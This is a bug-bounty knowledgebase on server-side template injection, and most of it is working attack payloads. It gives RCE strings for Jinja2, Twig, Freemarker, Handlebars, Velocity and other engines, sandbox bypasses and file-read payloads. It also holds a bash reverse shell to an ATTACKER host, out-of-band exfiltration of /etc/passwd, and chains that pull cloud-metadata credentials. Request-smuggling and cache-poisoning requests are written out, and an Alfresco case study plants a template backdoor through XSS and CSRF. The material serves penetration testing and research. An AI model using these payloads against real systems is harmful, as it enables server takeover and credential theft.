# Server-Side Template Injection (SSTI) — Comprehensive Bug Hunting Knowledgebase

> **Classification**: Web Application Vulnerability | Code Injection | Server-Side Execution  
> **Severity**: Critical (CVSS ~9.8) — Remote Code Execution, Data Exfiltration, SSRF, Privilege Escalation  
> **Scope**: Black-box, White-box, Gray-box Testing | Bug Bounty | Penetration Testing | Red Team  
> **Last Updated**: 2026-05-24

---

## Table of Contents

1. [Basics](#basics)
2. [SSTI Theory](#ssti-theory)
3. [Template Engine Internals](#template-engine-internals)
4. [Jinja2 Payloads](#jinja2-payloads)
5. [Twig Payloads](#twig-payloads)
6. [Freemarker Payloads](#freemarker-payloads)
7. [Handlebars Payloads](#handlebars-payloads)
8. [Mustache Payloads](#mustache-payloads)
9. [Sandbox Escape Techniques](#sandbox-escape-techniques)
10. [Template Engine RCE Chains](#template-engine-rce-chains)
11. [Arbitrary File Read Payloads](#arbitrary-file-read-payloads)
12. [SSRF + SSTI Chains](#ssrf--ssti-chains)
13. [Request Smuggling + SSTI Chains](#request-smuggling--ssti-chains)
14. [Cache Poisoning + SSTI Chains](#cache-poisoning--ssti-chains)
15. [OAuth + SSTI Chains](#oauth--ssti-chains)
16. [Parser Confusion Payloads](#parser-confusion-payloads)
17. [Browser Quirks](#browser-quirks)
18. [Gadget Chains](#gadget-chains)
19. [Real World Case Studies](#real-world-case-studies)
20. [Fuzzing Payloads](#fuzzing-payloads)
21. [Automation Workflows](#automation-workflows)
22. [Recon Methodology](#recon-methodology)
23. [Nuclei Templates](#nuclei-templates)
24. [Tools and Scanners](#tools-and-scanners)
25. [Advanced Research](#advanced-research)
26. [Bug Bounty Writeups](#bug-bounty-writeups)
27. [Payload Collections](#payload-collections)
28. [WAF Bypasses](#waf-bypasses)
29. [Detection Techniques](#detection-techniques)
30. [References](#references)

---

## Basics

### What is SSTI?

Server-Side Template Injection (SSTI) occurs when an attacker is able to inject native template syntax into a server-side template that is subsequently executed by the template engine. This happens when user input is concatenated directly into a template string rather than being passed as data variables.

**Vulnerable Pattern:**
```python
# Vulnerable - user input becomes part of the template
output = template.render("Hello " + request.GET['name'])

# Safe - user input passed as data
output = template.render("Hello {{name}}", {"name": request.GET['name']})
```

### Impact Spectrum

| Severity | Impact |
|----------|--------|
| **Critical** | Remote Code Execution (RCE), full server takeover |
| **High** | Arbitrary file read/write, SSRF, privilege escalation |
| **Medium** | Sensitive data exposure, information disclosure |
| **Low** | XSS (when output is rendered to client), DoS |

### Contexts of Vulnerability

1. **Plaintext Context**: User input is placed directly in template body
2. **Code Context**: User input is placed inside a template expression/statement
3. **Intentional Exposure**: Applications allowing users to submit/edit templates (wikis, CMS, email builders)
4. **Accidental Concatenation**: Developer concatenates user input into template strings

---

## SSTI Theory

### The Template Engine Trust Model

Template engines operate on a fundamental trust boundary: **templates are code, data is not**. When this boundary collapses and user-controlled data is treated as template code, SSTI occurs.

**Key Insight from PortSwigger Research (James Kettle, 2015):**
> "Template Injection can arise both through developer error, and through the intentional exposure of templates in an attempt to offer rich functionality, as commonly done by wikis, blogs, marketing applications and content management systems."

### Detection Methodology (D-I-E Framework)

```
Detect → Identify → Exploit
   ↓         ↓          ↓
Fuzzing   Engine     Read/Explore/Attack
          Fingerprinting
```

#### Phase 1: Detect

**Universal Polyglot Fuzz String:**
```
${{<%[%'"}}%\.
```

This string contains syntax fragments from multiple template engines. If the server throws a template parsing error, SSTI is likely present.

**Mathematical Probes by Context:**

| Context | Probe | Expected Success |
|---------|-------|------------------|
| Plaintext | `${7*7}` or `{{7*7}}` | Output contains `49` |
| Code | `}}` (breakout) + HTML tag | HTML rendered after expression |

**Critical Differentiator:**
```
{{7*'7'}} → Twig: 49 (string cast to int, multiplication)
{{7*'7'}} → Jinja2: 7777777 (string repetition, '7' * 7)
```

#### Phase 2: Identify

**Decision Tree for Engine Identification:**

```
Start: ${7*7}
  ├── Returns 49 → Java family (Freemarker, Velocity, Thymeleaf)
  │   ├── a{*comment*}b → Smarty
  │   └── ${"z".join("ab")} → Mako (returns 'zab') / Unknown
  └── Fails
      └── {{7*7}}
          ├── Returns 49 → PHP family
          │   ├── {{7*'7'}} == 49 → Twig
          │   └── {{7*'7'}} == 7777777 → Jinja2
          └── No output / Error → Not vulnerable or exotic engine
```

**Error-Based Engine Fingerprinting:**
```
(1/0).zxy.zxy
```

| Error Message | Language/Engine |
|--------------|---------------|
| `ZeroDivisionError` | Python (Jinja2, Django, Mako) |
| `java.lang.ArithmeticException` | Java (Freemarker, Velocity, Thymeleaf) |
| `ReferenceError` / `TypeError` | Node.js (Handlebars, Jade/Pug) |
| `Division by zero` / `DivisionByZeroError` | PHP (Twig, Smarty) |
| `divided by 0` | Ruby (ERB, Slim) |
| `Arithmetic operation failed` | Freemarker |

#### Phase 3: Exploit

**Three Sub-Phases:**
1. **Read**: Documentation review, security considerations, known exploits
2. **Explore**: Environment enumeration, object discovery, developer-supplied objects
3. **Attack**: Construct custom exploit chains

---

## Template Engine Internals

### How Template Engines Execute

**Compilation Pipeline:**
```
Template Source → Lexer → Parser → AST → Compiler → Bytecode/Native Code → Execute
```

**Trust Boundaries:**
- **Lexer/Parser**: Interprets template syntax (`{{`, `${`, `<%`, etc.)
- **AST**: Abstract syntax tree of template + expressions
- **Runtime**: Executes expressions in host language context (Python, Java, PHP, JS)

**The Core Problem:**
When user input reaches the parser, it becomes part of the AST. If the input contains valid template syntax, the engine executes it with the same privileges as legitimate template code.

### Object Access Patterns

Most engines expose:
1. **Built-in objects**: `self`, `environment`, `namespace`, `context`, `request`
2. **Developer objects**: Custom variables passed to template
3. **Host language runtime**: Python's `__builtins__`, Java's reflection, PHP's functions

**Enumeration Strategy:**
```python
# Python/Jinja2 - list all available objects
{{ [].__class__.__base__.__subclasses__() }}

# Java/Freemarker - access environment
${.globals}

# PHP/Twig - access global scope
{{ _self }}
```

---

## Jinja2 Payloads

> **Platform**: Python | **Default Sandbox**: No (dangerous) / Yes in some frameworks

### Detection

```jinja2
{{7*7}}
{{7*'7'}}  # Returns 7777777 (Jinja2) vs 49 (Twig)
{{config}}
```

### Basic RCE (Unsandboxed)

**Method 1: Via `__subclasses__()` (Classic)**
```jinja2
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}
```

**Method 2: Finding `os` or `subprocess` via subclasses**
```jinja2
{{ [].__class__.__base__.__subclasses__() }}
# Find index of <class 'subprocess.Popen'> or <class 'os._wrap_close'>
```

**Method 3: Direct `__builtins__` access**
```jinja2
{{__builtins__.open('/etc/passwd').read()}}
{{__builtins__.__import__('os').popen('id').read()}}
```

**Method 4: Via `lipsum` (Flask/Jinja2 specific)**
```jinja2
{{lipsum.__globals__.os.popen('id').read()}}
{{lipsum.__globals__.__builtins__.open('/etc/passwd').read()}}
```

**Method 5: Via `joiner` or `cycler`**
```jinja2
{{joiner.__init__.__globals__.os.popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

**Method 6: Via `namespace()`**
```jinja2
{{namespace().__init__.__globals__.os.popen('id').read()}}
```

### File Read

```jinja2
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}
{{lipsum.__globals__.open('/etc/passwd').read()}}
{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}
```

### SSTI to Reverse Shell

```jinja2
{{lipsum.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/ATTACKER/PORT 0>&1"').read()}}
```

### Jinja2 Sandbox Bypass

When `jinja2.sandbox.SandboxedEnvironment` is used, many attributes are restricted. Bypass techniques:

**Bypass 1: Via `attr()` filter + string concatenation**
```jinja2
{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()}}
```

**Bypass 2: Via `__getitem__` + `request.args`**
```jinja2
{{request['application']['__globals__']['__builtins__']['open']('/etc/passwd').read()}}
```

**Bypass 3: Using `|select` or `|map` filters with callbacks**
```jinja2
{{()|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(132)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen')('id')|attr('read')()}}
```

**Bypass 4: Python 3.7+ `__class_getitem__` chains**
```jinja2
{{(dict|attr('__mro__')|attr('__getitem__')(1))|attr('__subclasses__')()|attr('__getitem__')(117).__init__.__globals__['__builtins__']['__import__']('os')['popen']('id')['read']()}}
```

**Bypass 5: Unicode/normalization tricks**
```jinja2
{{request|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

### Filter Bypass (No underscores, no quotes)

```jinja2
{{request|attr(request.args.get('a'))|attr(request.args.get('b'))('os')|attr(request.args.get('c'))('id')|attr(request.args.get('d'))()}}
# URL: ?a=__class__&b=__init__&c=popen&d=read
```

**Using `|join` to construct strings:**
```jinja2
{{()|attr(['_','_','c','l','a','s','s','_','_']|join)}}
```

### Jinja2 in Flask (Specific Gadgets)

```jinja2
{{url_for.__globals__['current_app'].config}}
{{get_flashed_messages.__globals__['current_app'].config}}
{{config.items()}}
```

### Blind Jinja2 SSTI

**Boolean-based detection:**
```jinja2
{% if '7' in '777' %}yes{% endif %}
```

**Time-based detection:**
```jinja2
{{__import__('time').sleep(5)}}
```

**Out-of-band exfiltration:**
```jinja2
{{__import__('urllib').request.urlopen('http://ATTACKER/?d='+open('/etc/passwd').read())}}
```

---

## Twig Payloads

> **Platform**: PHP | **Default Sandbox**: Yes (since 1.20+)

### Detection

```twig
{{7*7}}
{{7*'7'}}  # Returns 49 (Twig) vs 7777777 (Jinja2)
{{dump()}}
{{_self}}
```

### Basic RCE (Twig < 1.20 / Unsandboxed)

**Method 1: `registerUndefinedFilterCallback` + `getFilter`**
```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

**Method 2: `setCache` + Remote File Include (legacy PHP)**
```twig
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
```
> Note: Modern PHP has `allow_url_include=Off` by default, making this unreliable.

### Twig Sandbox Bypass

**Method 1: `displayBlock` gadget (Twig sandbox fixed in 1.20.0)**
```twig
{{_self.displayBlock("id",[],{"id":[userObject,"vulnerableMethod"]})}}
```
> This abuses the fact that `Twig_TemplateInterface` and `Twig_Markup` objects bypass sandbox method restrictions.

**Method 2: Developer-supplied object method calls**
```twig
{{app.request.server.all}}
{{app.request.headers.all}}
```

**Method 3: PHP Filter chains via `filter` function**
```twig
{{'/etc/passwd'|file_excerpt(1,-1)}}
```

### File Read in Twig

```twig
{{'/etc/passwd'|file_excerpt(1,-1)}}
{{source('/etc/passwd')}}
{{include('/etc/passwd')}}
```

### Information Disclosure

```twig
{{dump(app)}}  # Dumps entire application context
{{dump(_self)}}  # Dumps template object
{{dump(_context)}}  # Dumps all template variables
```

### Blind Twig SSTI

```twig
{# Time-based #}
{% if 7*7 == 49 %}{{sleep(5)}}{% endif %}

{# Error-based #}
{{7/0}}
```

---

## Freemarker Payloads

> **Platform**: Java | **Common in**: Alfresco, Liferay, Apache OFBiz

### Detection

```freemarker
${7*7}
<#assign x=7*7>${x}
```

### Basic RCE

**Method 1: `?new()` with `Execute` class (classic)**
```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}
```

**Method 2: `?new()` with `JythonRuntime`**
```freemarker
<#assign rt="freemarker.ext.jython.JythonRuntime"?new()>
<#assign x=rt("import os; print(os.popen('id').read())")>
```

**Method 3: `?api` bypass (Freemarker 2.3.22+)**
```freemarker
<#assign classLoader=object?api.class.protectionDomain.classLoader>
<#assign clazz=classLoader.loadClass("ClassWithStaticMethod")>
${clazz?api.method()}
```

### Arbitrary File Read

```freemarker
<#assign uri=object?api.class.getResource("/").toURI()>
<#assign input=uri?api.create("file:///etc/passwd").toURL().openConnection()>
<#assign is=input?api.getInputStream()>
FILE: <#list 0..999 as _>
    <#assign byte=is.read()>
    <#if byte == -1><#break></#if>
    ${byte?chr}
<#t></#list>
```

### Freemarker Sandbox Bypass

**Bypass 1: Using `?api` on strings/numbers**
```freemarker
${"freemarker.template.utility.Execute"?api.getClass()}
```

**Bypass 2: `Configuration.setNewBuiltinClassResolver` misconfiguration**
If the `TemplateClassResolver` is set to `SAFER_RESOLVER` or `UNRESTRICTED_RESOLVER`, `?new()` may be available.

**Bypass 3: Accessing `Environment` internals**
```freemarker
<#assign env=.globals['freemarker.core.Environment'].getCurrentEnvironment()>
```

### SSRF via Freemarker

```freemarker
<#assign url=.createObject("java.net.URL", "http://attacker.net/")>
<#assign conn=url.openConnection()>
${conn.getResponseCode()}
```

---

## Handlebars Payloads

> **Platform**: Node.js / JavaScript (server-side) | **Common in**: Express, Koa, email templates

### Detection

```handlebars
{{7*7}}
{{this}}
{{constructor}}
```

### Basic RCE (Node.js)

**Method 1: Prototype Pollution to RCE (Handlebars < 4.7.7)**
```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id')"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

**Method 2: `constructor` + `helperMissing`**
```handlebars
{{#with this}}
  {{#with constructor}}
    {{#with (lookup this "constructor")}}
      {{#with (lookup this "constructor")}}
        {{(lookup this "exec") "id"}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

**Method 3: Simpler Node.js RCE**
```handlebars
{{#with this}}
  {{#with constructor}}
    {{#with (lookup this "return process.mainModule.require('child_process').execSync('id').toString()")}}
      {{this}}
    {{/with}}
  {{/with}}
{{/with}}
```

### Handlebars Sandbox Bypass

**Bypass 1: Using `lookup` to access blocked properties**
```handlebars
{{lookup (lookup this "constructor") "name"}}
```

**Bypass 2: `blockHelperMissing` / `helperMissing` callbacks**
```handlebars
{{#with this as |obj|}}
  {{obj.constructor.constructor}}
{{/with}}
```

### File Read (Node.js)

```handlebars
{{require('fs').readFileSync('/etc/passwd')}}
{{process.mainModule.require('fs').readFileSync('/etc/passwd')}}
```

---

## Mustache Payloads

> **Platform**: Logic-less template engine | **Security Model**: Safe by design (no expressions)

### Critical Note

Mustache is **logic-less** by design — it does not support expressions, conditionals, or function calls in the template itself. Therefore, **classic SSTI does not apply** to pure Mustache.

### When Mustache Becomes Dangerous

**Scenario 1: Pre-processing with logic-full engine**
If user input is first processed through a logic-full engine (like Handlebars or Jinja2) and then passed to Mustache, the first engine is the attack surface.

**Scenario 2: Tag Injection in downstream parsers**
```mustache
{{user_input}}  <!-- If user_input contains {{{...}}} -->
```
If the application allows triple-mustache `{{{...}}}` (unescaped HTML), XSS is possible but not server-side code execution.

**Scenario 3: Template Injection in Mustache implementations**
Some Mustache implementations (like Ruby's) allow lambdas/procs that execute code:
```ruby
# Ruby Mustache - lambda evaluation
{{#lambda}}...{{/lambda}}
```

### Detection

```mustache
{{7*7}}  # Should render literally as "{{7*7}}" in pure Mustache
```
If `{{7*7}}` evaluates to `49`, you're not dealing with pure Mustache — likely Handlebars or a mixed engine.

---

## Sandbox Escape Techniques

### General Principles

Sandboxing in template engines typically restricts:
1. Attribute access (`__class__`, `__bases__`, etc.)
2. Method calls on dangerous classes
3. Import/require statements
4. File system access

**Escape Strategy:** Find objects that:
- Are NOT sandboxed (developer objects, framework objects)
- Have references to unsandboxed classes
- Implement `__getitem__`, `__getattr__`, or similar magic methods
- Are passed through from the host application

### Python/Jinja2 Sandbox Escapes

**Technique 1: `attr()` filter + string construction**
```jinja2
{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()}}
```

**Technique 2: Using `request` object (Flask/Django)**
```jinja2
{{request.__class__._load_form_data.__globals__.__builtins__.open('/etc/passwd').read()}}
```

**Technique 3: `config` / `session` objects**
```jinja2
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

**Technique 4: Unicode escape sequences**
```jinja2
{{request|attr('\x5f\x5fglobals\x5f\x5f')}}
```

**Technique 5: UTF-7 / Unicode normalization bypasses**
```jinja2
{{request|attr('＿＿globals＿＿')}}  # Fullwidth underscores
```

### Java Sandbox Escapes

**Technique 1: Reflection via `Class.forName`**
```freemarker
${.new_instance("java.lang.Runtime")}
```

**Technique 2: `ScriptEngineManager` (Nashorn/Rhino)**
```freemarker
<#assign mgr=Class.forName("javax.script.ScriptEngineManager").newInstance()>
<#assign engine=mgr.getEngineByName("js")>
${engine.eval("java.lang.Runtime.getRuntime().exec('id')")}
```

**Technique 3: JNDI/LDAP injection via templates**
```freemarker
${Class.forName("javax.naming.InitialContext").newInstance().lookup("ldap://attacker.net/exploit")}
```

### PHP/Twig Sandbox Escapes

**Technique 1: `constant()` function**
```twig
{{constant('PHP_BINARY')}}
{{constant('PHP_VERSION')}}
```

**Technique 2: `include()` with data:// or php://filter**
```twig
{{include('php://filter/read=convert.base64-encode/resource=/etc/passwd')}}
```

**Technique 3: `file_excerpt` / `source` functions**
```twig
{{source('php://input')}}
```

---

## Template Engine RCE Chains

### Jinja2 → Full RCE Chain

```
1. Detect: {{7*'7'}} == 7777777
2. Enumerate: {{''.__class__.__mro__}}
3. Find subprocess.Popen: {{''.__class__.__base__.__subclasses__()[X]}}
4. Execute: {{''.__class__.__base__.__subclasses__()[X]('id',shell=True,stdout=-1).communicate()}}
```

**One-liner discovery + execution:**
```jinja2
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
```

### Twig → Full RCE Chain

```
1. Detect: {{7*7}} == 49
2. Access env: {{_self.env}}
3. Register callback: {{_self.env.registerUndefinedFilterCallback("system")}}
4. Execute: {{_self.env.getFilter("id")}}
```

### Freemarker → Full RCE Chain

```
1. Detect: ${7*7} == 49
2. Check ?new() availability: <#assign x="java.lang.String"?new()>
3. Execute: <#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}
4. If blocked, try ?api or JythonRuntime
```

### Velocity → Full RCE Chain

```
1. Detect: #set($x=7*7)${x} == 49
2. Brute-force variables: $class, $class.inspect("java.lang.Runtime")
3. Chain: $class.inspect("java.lang.Runtime").type.getRuntime().exec("id")
4. Read output via InputStream
```

### Handlebars → Full RCE Chain

```
1. Detect: {{7*7}} == 49 (Node.js math)
2. Access constructor: {{constructor.constructor}}
3. Build payload via prototype chain
4. Execute: {{#with this}}{{constructor.constructor "return process.mainModule.require('child_process').execSync('id')"}}{{/with}}
```

### Mako → Full RCE Chain

```mako
<%
import os
x=os.popen('id').read()
%>
${x}
```

### ERB (Ruby) → Full RCE Chain

```erb
<%= `id` %>
<%= IO.popen('id').read %>
<%= Dir.entries('/') %>
<%= File.open('/etc/passwd').read %>
```

### Jade/Pug → Full RCE Chain

```jade
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id')
```

---

## Arbitrary File Read Payloads

### Python / Jinja2

```jinja2
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}
{{lipsum.__globals__.open('/etc/passwd').read()}}
{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}
{{request.__class__._load_form_data.__globals__.__builtins__.open('/etc/passwd').read()}}
```

### PHP / Twig

```twig
{{'/etc/passwd'|file_excerpt(1,-1)}}
{{source('/etc/passwd')}}
{{include('/etc/passwd')}}
```

### Java / Freemarker

```freemarker
<#assign uri=object?api.class.getResource("/").toURI()>
<#assign input=uri?api.create("file:///etc/passwd").toURL().openConnection()>
<#assign is=input?api.getInputStream()>
<#list 0..999 as _>
    <#assign byte=is.read()>
    <#if byte == -1><#break></#if>
    ${byte?chr}
</#list>
```

### Java / Velocity

```velocity
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("cat /etc/passwd"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```

### Node.js / Handlebars

```handlebars
{{require('fs').readFileSync('/etc/passwd')}}
{{process.mainModule.require('fs').readFileSync('/etc/passwd')}}
```

### Ruby / ERB

```erb
<%= File.open('/etc/passwd').read %>
<%= Dir.glob('/etc/*') %>
```

---

## SSRF + SSTI Chains

### Concept

SSTI provides code execution, which can be leveraged to make HTTP requests from the server. This creates a powerful SSRF chain where the template engine becomes the SSRF vector.

### Jinja2 → SSRF

```jinja2
{{__import__('urllib').request.urlopen('http://169.254.169.254/latest/meta-data/').read()}}
{{__import__('requests').get('http://169.254.169.254/latest/meta-data/').text}}
```

### Freemarker → SSRF

```freemarker
<#assign url=.createObject("java.net.URL", "http://169.254.169.254/latest/meta-data/")>
<#assign conn=url.openConnection()>
${conn.getResponseCode()}
<#assign is=conn.getInputStream()>
<#list 0..999 as _>
    <#assign byte=is.read()>
    <#if byte == -1><#break></#if>
    ${byte?chr}
</#list>
```

### Twig → SSRF

```twig
{{include('http://169.254.169.254/latest/meta-data/')}}
```
> Note: `include()` with URLs depends on PHP `allow_url_include`.

### Velocity → SSRF

```velocity
#set($url=$class.inspect("java.net.URL").type.getConstructor($class.inspect("java.lang.String").type).newInstance("http://169.254.169.254/"))
#set($conn=$url.openConnection())
$conn.getResponseCode()
```

### Cloud Metadata Extraction Chains

**AWS:**
```jinja2
{{__import__('urllib').request.urlopen('http://169.254.169.254/latest/meta-data/iam/security-credentials/').read()}}
```

**GCP:**
```jinja2
{{__import__('urllib').request.urlopen('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', headers={'Metadata-Flavor':'Google'}).read()}}
```

**Azure:**
```jinja2
{{__import__('urllib').request.urlopen('http://169.254.169.254/metadata/instance?api-version=2021-02-01', headers={'Metadata':'true'}).read()}}
```

**DigitalOcean:**
```jinja2
{{__import__('urllib').request.urlopen('http://169.254.169.254/metadata/v1.json').read()}}
```

---

## Request Smuggling + SSTI Chains

### Concept

HTTP Request Smuggling (HRS) can be used to poison the request queue, causing another user's request to be processed with attacker-controlled headers/body. If that request hits a template endpoint, SSTI can be triggered in the victim's session context.

### Attack Chain

```
Attacker → Front-end (CDN/WAF) → Back-end (App Server)
   ↓              ↓                    ↓
Smuggled    Desync causes        Victim's request
request     request queue          processed with
            poisoning              attacker's body
                                     ↓
                              SSTI payload in victim's
                              authenticated session
```

### CL.TE Smuggling + SSTI

```http
POST /template-preview HTTP/1.1
Host: target.com
Content-Length: 150
Transfer-Encoding: chunked

0

POST /template-preview HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 50
Cookie: victim_session=...

name={{7*7}}&template={{self.__init__.__globals__}}
```

### TE.CL Smuggling + SSTI

```http
POST /template-preview HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
POST /template-preview HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 50
Cookie: victim_session=...

name={{7*7}}&template={{self.__init__.__globals__}}
0

```

### Browser-Powered Desync + SSTI

From PortSwigger Research (James Kettle):
> "Browser-powered desync attacks use a victim's browser to send smuggled requests to a vulnerable web server."

If the application has a template preview feature accessible via POST with CSRF protection that can be bypassed via request smuggling, an attacker can force the victim's browser to submit an SSTI payload in their authenticated session.

**Key Tools:**
- `http-request-smuggler` (Burp extension)
- `smuggler` (defparam)
- `param-miner` (Burp extension — detects hidden parameters)

---

## Cache Poisoning + SSTI Chains

### Concept

Web Cache Poisoning (WCP) tricks a cache into storing a malicious response. If the cached response contains SSTI payload output, subsequent users receive the poisoned (potentially executed) content. More powerfully, if the cache key can be manipulated to cause the application to process an SSTI payload for cache storage, the payload may execute during cache population.

### Cache Key Injection + SSTI

**X-Forwarded-Host / Host header confusion:**
```http
GET /email-template?name={{7*7}} HTTP/1.1
Host: attacker.net
X-Forwarded-Host: victim.com
```

If the cache uses `Host` for the key but the app uses `X-Forwarded-Host` for template generation, the cache stores the executed template for `attacker.net` but serves it to `victim.com` requests.

### Param Miner + SSTI

Using `param-miner` to find unkeyed parameters that affect template rendering:
```
GET /page?__template={{7*7}} HTTP/1.1
```

If `__template` is unkeyed by the cache but processed by the template engine, cache poisoning with SSTI is possible.

### Practical Exploitation (PortSwigger Research)

From "Practical Web Cache Poisoning" (James Kettle, 2018):
> "Unkeyed inputs are everywhere — headers, cookies, parameters. If any of these influence template selection or template variable assignment, cache poisoning becomes a delivery mechanism for SSTI."

**Common unkeyed headers that may affect templates:**
- `X-Forwarded-Host`
- `X-Original-URL`
- `X-Rewrite-URL`
- `X-HTTP-Method-Override`
- `Cookie` (if cache ignores cookies but app uses them for personalization)

---

## OAuth + SSTI Chains

### Concept

OAuth flows often involve redirect URIs, state parameters, and callback handling. If any of these values are reflected into templates (error pages, confirmation emails, profile pages), SSTI can be injected into the OAuth flow.

### Attack Vectors

**Vector 1: `redirect_uri` in template error page**
```
https://victim.com/oauth/authorize?client_id=...&redirect_uri={{7*7}}
```
If the error page template renders the invalid `redirect_uri`, SSTI is triggered.

**Vector 2: `state` parameter reflected in post-auth template**
```
https://victim.com/oauth/callback?code=...&state={{7*7}}
```

**Vector 3: OAuth profile import → template rendering**
When OAuth imports user profile data (name, email, avatar URL) and renders it in a template:
```
Name: {{user.name}}  # If name is attacker-controlled via OAuth registration
```
Attacker sets OAuth profile name to `{{7*7}}` or RCE payload.

### Hidden OAuth Attack Surfaces

From PortSwigger Research "Hidden OAuth Attack Vectors":
> "OpenID Connect `id_token` claims, SAML assertions, and JWT payloads may all be deserialized and rendered into templates. If the template engine processes these claims without proper escaping, SSTI can occur during SSO authentication."

**Example: `id_token` claim rendered in welcome template**
```jinja2
Welcome, {{id_token.name}}!
```
If `name` claim is attacker-controlled: `{{id_token.name}}` → `{{7*7}}` → `49`

---

## Parser Confusion Payloads

### Concept

Parser confusion occurs when multiple parsers process the same input, and each interprets it differently. This is common in:
- JSON + Template engines
- XML + Template engines
- Markdown + Template engines
- URL-encoded data + Template engines

### JSON + Jinja2 Confusion

If the application accepts JSON and passes it to a template:
```json
{
  "name": "{{7*7}}"
}
```
The JSON parser sees a string. The template engine sees Jinja2 syntax.

### XML + Freemarker Confusion

```xml
<user>
  <name><#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}</name>
</user>
```

### Markdown + Handlebars Confusion

```markdown
# Welcome {{7*7}}

Your report: {{constructor.constructor}}
```

### URL Encoding Bypass

```
name=%7B%7B7*7%7D%7D
```
Some WAFs decode once and check, but the template engine decodes again and executes.

### Double Encoding

```
name=%257B%257B7*7%257D%257D
```
WAF decodes to `%7B%7B7*7%7D%7D`, template engine decodes to `{{7*7}}`.

---

## Browser Quirks

### Character Encoding Differences

**UTF-7 Injection (legacy IE):**
```
+ADw-7*7+AD4-  →  <7*7>  (in UTF-7)
```
If the server processes the decoded value through a template, SSTI may trigger.

**Overlong UTF-8:**
```
%C0%A7  →  <  (overlong encoding)
```
Some parsers normalize overlong UTF-8 before template processing, bypassing filters.

### Browser-Specific Header Injection

**Chrome's `X-Client-Data`:**
If reflected in templates, may contain attacker-influenced data.

**Safari's `X-Apple-Store-Front`:**
Similarly, if processed as template data.

### postMessage + SSTI

If a template is rendered based on `postMessage` data (in Electron or hybrid apps):
```javascript
// Vulnerable Electron app
window.addEventListener('message', (e) => {
    document.getElementById('preview').innerHTML = e.data.template;  // Client-side
    // But if sent to server for PDF generation:
    fetch('/render', {method:'POST', body: JSON.stringify({template: e.data.template})});
});
```

---

## Gadget Chains

### Jinja2 / Flask Gadgets

**Gadget 1: `url_for` → `current_app.config`**
```jinja2
{{url_for.__globals__['current_app'].config}}
{{url_for.__globals__['current_app'].config['SECRET_KEY']}}
```

**Gadget 2: `get_flashed_messages` → `current_app`**
```jinja2
{{get_flashed_messages.__globals__['current_app'].config}}
```

**Gadget 3: `session` → `SecureCookieSessionInterface`**
```jinja2
{{session.__class__.__init__.__globals__['sys'].modules['werkzeug.contrib.securecookie']}}
```

**Gadget 4: `request` → `json` module → `JSONDecoder`**
```jinja2
{{request.__class__.__init__.__globals__['json'].JSONDecoder().decode('{"a":1}')}}
```

### Twig / Symfony Gadgets

**Gadget 1: `app.request` → `ParameterBag`**
```twig
{{app.request.server.all}}
{{app.request.headers.all}}
{{app.request.cookies.all}}
```

**Gadget 2: `app.security` → `TokenStorage`**
```twig
{{app.security.token.user}}
```

### Freemarker / Spring Gadgets

**Gadget 1: `springMacroRequestContext` → `WebApplicationContext`**
```freemarker
${springMacroRequestContext.webApplicationContext}
```

**Gadget 2: `RequestContext` → `ApplicationContext`**
```freemarker
${RequestContext.getWebApplicationContext()}
```

### Handlebars / Express Gadgets

**Gadget 1: `req` / `res` objects**
```handlebars
{{req.app.settings}}
{{req.app._router.stack}}
```

**Gadget 2: `settings` → `view cache`**
```handlebars
{{settings.views}}
{{settings.env}}
```

---

## Real World Case Studies

### Case Study 1: Alfresco (FreeMarker)

**Vulnerability**: Stored XSS in comments + FreeMarker template injection
**Impact**: Low-privilege user → RCE as root

**Chain:**
1. Attacker posts XSS payload in comment
2. Admin views comment → XSS fires
3. XSS uses CSRF to edit a FreeMarker template
4. Template contains: `<#assign ex="freemarker.template.utility.Execute"?new()> ${ex(url.getArgs())}`
5. Any request to that template executes attacker command

**Key Payload:**
```javascript
// XSS payload to install FreeMarker backdoor
tok = /Alfresco-CSRFToken=([^;]*)/.exec(document.cookie)[1];
do_csrf = new XMLHttpRequest();
do_csrf.open("POST","/share/proxy/alfresco/api/node/workspace/SpacesStore/.../formprocessor",false);
do_csrf.setRequestHeader('Content-Type','application/json; charset=UTF-8');
